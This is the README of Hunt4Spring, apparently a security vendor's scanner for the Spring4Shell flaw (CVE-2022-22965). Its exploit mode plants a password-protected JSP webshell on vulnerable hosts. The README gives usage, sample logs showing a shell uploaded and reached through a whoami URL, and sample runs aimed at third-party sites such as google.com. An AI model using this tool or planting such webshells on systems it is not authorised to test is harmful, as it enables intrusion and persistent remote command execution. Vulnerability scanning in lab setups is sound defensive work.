# Hunt4Spring

Hunt4Spring helps with identifying as well as exploiting URLs which are potentially vulnerable to [CVE-2022-22965](https://tanzu.vmware.com/security/cve-2022-22965) aka Spring4Shell.

**Video Demo:** https://www.youtube.com/watch?v=JnAnXDFKkF0

## Usage :

   ```
    $ ./hunt4spring -h

     _    _             _   _  _   _____            _             
    | |  | |           | | | || | / ____|          (_)            
    | |__| |_   _ _ __ | |_| || || (___  _ __  _ __ _ _ __   __ _ 
    |  __  | | | | '_ \| __|__   _\___ \| '_ \| '__| | '_ \ / _  |
    | |  | | |_| | | | | |_   | | ____) | |_) | |  | | | | | (_| |
    |_|  |_|\__,_|_| |_|\__|  |_||_____/| .__/|_|  |_|_| |_|\__, |
                                        | |                  __/ |
                                        |_|                 |___/ 
                                                                                                                                                                                            
    

    [+] Hunt4Spring by RedHunt Labs - A Modern Attack Surface (ASM) Management Company
    [+] Author: Umair Nehri (RHL Research Team)
    [+] Continuously Track Your Attack Surface using https://redhuntlabs.com/nvadr. 
    
    Usage of ./hunt4spring:
    -exploit
            Turns on exploitation mode.
    -file string
            Specify a file containing a list of target URLs.
    -outfile string
            Output file name to store results. (default "hunt4spring.json")
    -url string
            Specify a single target URL.
   ```

### Flags
In order to run Hunt4Spring, users have two options available. Either they can provide a single URL using the **-url** flag or provide with bulk URLs through a file by using the **-file** flag. They can even specify the name of the file where they would like to store the output in JSON format by using the **-outfile** flag. [By default the output gets stored in hunt4spring.json]

```sh
$ ./hunt4spring -url http://127.0.0.1:8080/ -exploit -outfile op.json

 _    _             _   _  _   _____            _             
| |  | |           | | | || | / ____|          (_)            
| |__| |_   _ _ __ | |_| || || (___  _ __  _ __ _ _ __   __ _ 
|  __  | | | | '_ \| __|__   _\___ \| '_ \| '__| | '_ \ / _  |
| |  | | |_| | | | | |_   | | ____) | |_) | |  | | | | | (_| |
|_|  |_|\__,_|_| |_|\__|  |_||_____/| .__/|_|  |_|_| |_|\__, |
                                    | |                  __/ |
                                    |_|                 |___/ 
                                                                                                                                                                                        


[+] Hunt4Spring by RedHunt Labs - A Modern Attack Surface (ASM) Management Company
[+] Author: Umair Nehri (RHL Research Team)
[+] Continuously Track Your Attack Surface using https://redhuntlabs.com/nvadr. 

2022/04/01 17:40:04 Checking: http://127.0.0.1:8080/
2022/04/01 17:40:04 http://127.0.0.1:8080/ [Seems to be vulnerable!]
2022/04/01 17:40:04 Trying to exploit: http://127.0.0.1:8080/
2022/04/01 17:40:06 Shell was successfully uploaded! Address: http://127.0.0.1:8080/shell.jsp?pwd=hunt4spring&cmd=whoami

+------------------------+---------------------------+
|          HOST          | VULNERABILITY POSSIBILITY |
+------------------------+---------------------------+
| http://127.0.0.1:8080/ | YES                       |
+------------------------+---------------------------+
```

### Usage Modes 
#### Default Mode
In the default mode, user doesn't has to specify any additional flags and this mode would be used by the tool by default. The tool will look for all URL/URLs which are potentially vulnerable to this vulnerability.

#### Usage:
We do  not have to provide any additional flags in this case.
<br>
```sh
$ ./hunt4spring -file test.txt

 _    _             _   _  _   _____            _             
| |  | |           | | | || | / ____|          (_)            
| |__| |_   _ _ __ | |_| || || (___  _ __  _ __ _ _ __   __ _ 
|  __  | | | | '_ \| __|__   _\___ \| '_ \| '__| | '_ \ / _  |
| |  | | |_| | | | | |_   | | ____) | |_) | |  | | | | | (_| |
|_|  |_|\__,_|_| |_|\__|  |_||_____/| .__/|_|  |_|_| |_|\__, |
                                    | |                  __/ |
                                    |_|                 |___/ 
                                                                                                                                                                                        


[+] Hunt4Spring by RedHunt Labs - A Modern Attack Surface (ASM) Management Company
[+] Author: Umair Nehri (RHL Research Team)
[+] Continuously Track Your Attack Surface using https://redhuntlabs.com/nvadr. 

2022/04/01 17:42:20 Checking: http://google.com/

2022/04/01 17:42:21 Checking: https://epic.com/

2022/04/01 17:42:26 Checking: http://127.0.0.1:8082/

2022/04/01 17:42:26 Checking: http://127.0.0.1:8080/
2022/04/01 17:42:26 http://127.0.0.1:8080/ [Seems to be vulnerable!]

2022/04/01 17:42:26 Checking: http://127.0.0.1/

+------------------------+---------------------------+
|          HOST          | VULNERABILITY POSSIBILITY |
+------------------------+---------------------------+
| http://google.com/     | NO                        |
| https://epic.com/      | NO                        |
| http://127.0.0.1:8082/ | NO                        |
| http://127.0.0.1:8080/ | YES                       |
| http://127.0.0.1/      | NO                        |
+------------------------+---------------------------+

```
#### Exploit Mode
In the exploit mode, the tool would not just scan the URL/URLs but would even try to exploit them by placing a webshell in the target's root directory. The name of the webshell would be **shell.jsp** having the password **hunt4spring**.

#### Usage:
In order to enable exploit mode, we have to provide an addtional flag (-exploit=true) along with the normal input flags.
<br>
```sh
$ ./hunt4spring -file test.txt -exploit

 _    _             _   _  _   _____            _             
| |  | |           | | | || | / ____|          (_)            
| |__| |_   _ _ __ | |_| || || (___  _ __  _ __ _ _ __   __ _ 
|  __  | | | | '_ \| __|__   _\___ \| '_ \| '__| | '_ \ / _  |
| |  | | |_| | | | | |_   | | ____) | |_) | |  | | | | | (_| |
|_|  |_|\__,_|_| |_|\__|  |_||_____/| .__/|_|  |_|_| |_|\__, |
                                    | |                  __/ |
                                    |_|                 |___/ 
                                                                                                                                                                                        


[+] Hunt4Spring by RedHunt Labs - A Modern Attack Surface (ASM) Management Company
[+] Author: Umair Nehri (RHL Research Team)
[+] Continuously Track Your Attack Surface using https://redhuntlabs.com/nvadr. 

2022/04/01 17:44:03 Checking: http://google.com/
2022/04/01 17:44:04 Trying to exploit: http://google.com/

2022/04/01 17:44:06 Checking: https://epic.com/
2022/04/01 17:44:11 Trying to exploit: https://epic.com/

2022/04/01 17:44:17 Checking: http://127.0.0.1:8082/
2022/04/01 17:44:17 Trying to exploit: http://127.0.0.1:8082/

2022/04/01 17:44:17 Checking: http://127.0.0.1:8080/
2022/04/01 17:44:17 http://127.0.0.1:8080/ [Seems to be vulnerable!]
2022/04/01 17:44:17 Trying to exploit: http://127.0.0.1:8080/
2022/04/01 17:44:20 Shell was successfully uploaded! Address: http://127.0.0.1:8080/shell.jsp?pwd=hunt4spring&cmd=whoami

2022/04/01 17:44:20 Checking: http://127.0.0.1/
2022/04/01 17:44:20 Trying to exploit: http://127.0.0.1/

+------------------------+---------------------------+
|          HOST          | VULNERABILITY POSSIBILITY |
+------------------------+---------------------------+
| http://google.com/     | NO                        |
| https://epic.com/      | NO                        |
| http://127.0.0.1:8082/ | NO                        |
| http://127.0.0.1:8080/ | YES                       |
| http://127.0.0.1/      | NO                        |
+------------------------+---------------------------+
```

### Output
The output file saves the data in JSON format like below:
```json
[
    {
        "host": "http://127.0.0.1:8080/",
        "is_vulnerable": true,
        "exploit_completed": true,
        "payload_path": "http://127.0.0.1:8080/shell.jsp?pwd=hunt4spring\u0026cmd=whoami"
    }
]
```

 ### Setting up a Test Environment
  If you'd like to test out Spring4Hunt or the Spring4Shell vulnerability in general, then you can refer to these awesome docker images:
* <a href="https://github.com/reznok/Spring4Shell-POC">Spring4Shell-POC</a>
The installation process is pretty simple. You can refer to the below steps for setting it up locally:
    ```
    git clone https://github.com/reznok/Spring4Shell-POC.git
    docker build . -t spring4shell && docker run -p 8080:8080 spring4shell
    ```
The app should now be available at <a href="http://localhost:8080/helloworld/greeting">http://localhost:8080/helloworld/greeting</a>

* <a href="https://hub.docker.com/r/vulfocus/spring-core-rce-2022-03-29">vulfocus/spring-core-rce-2022-03-29</a>

The installation process is quite simple in this case as well, you just have to run the below command: 
    ```
    docker run -p 9090:8080 vulfocus/spring-core-rce-2022-03-29
    ```
The app should now be available at <a href="http://localhost:9090">http://localhost:9090</a>

### More details around Spring4Shell
We have covered more details around Log4j Vulnerability in our <a href="#">Blog</a>.

### License & Version
The tool is licensed under the MIT license. See <a href="LICENSE">LICENSE</a>.
Currently the tool is at v0.1.

### Credits
The Research Team at [RedHunt Labs](https://redhuntlabs.com) would like to thank [vx-underground](https://www.vx-underground.org/) for the POC hosted on their <a href="https://share.vx-underground.org/">website</a>.

##### **[`To know more about our Attack Surface Management platform, check out NVADR.`](https://redhuntlabs.com/nvadr)**
